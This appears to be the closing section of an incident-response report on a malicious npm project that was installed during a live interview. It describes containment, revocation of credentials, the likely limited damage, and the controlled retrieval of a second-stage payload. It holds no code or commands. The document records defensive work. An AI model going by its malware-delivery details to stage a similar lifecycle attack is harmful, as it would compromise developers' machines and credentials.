- **Containment:** The victim interrupted network reachability, blackholed the C2, searched for and killed suspicious processes, removed the original repository, cleaned npm artifacts, preserved evidence, audited credential surfaces, and broadly revoked or invalidated identified authentication material.
- **Actual damage after containment:** Likely limited. First-stage environment exposure is likely; successful direct-IP C2 delivery, follow-on eval, file theft, and wallet compromise are not proven. Credential-abuse risk was materially reduced through revocation and logout, with Claude removal/revocation still pending unless separately confirmed.

This assessment is based on static local evidence and recorded response artifacts. No attacker-provided project code was executed during the later controlled analysis. This does not mean the malicious project never executed: the root `npm i` did execute during the live interview and triggered the malicious lifecycle path. The only live infrastructure contact during the later analysis was a controlled, fake-environment POST to the Vercel endpoint to retrieve and preserve the second-stage payload without executing it.
